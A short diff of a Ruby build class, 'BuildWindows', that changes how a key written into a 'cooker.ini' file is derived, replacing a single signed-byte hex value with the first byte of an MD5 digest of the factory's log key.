@@ -126,8 +126,7 @@ class BuildWindows < Build
 
     if params['cooked'] == true
       @cooked = true
-      key = @factory.logkey.chr.ord
-      key = "%02X" % ((key > 127) ? (key - 256) : key)
+      key = Digest::MD5.digest(@factory.logkey).unpack('H2').first.upcase
 
       # write the ini file
       File.open(path('cooker.ini'), 'w') do |f|
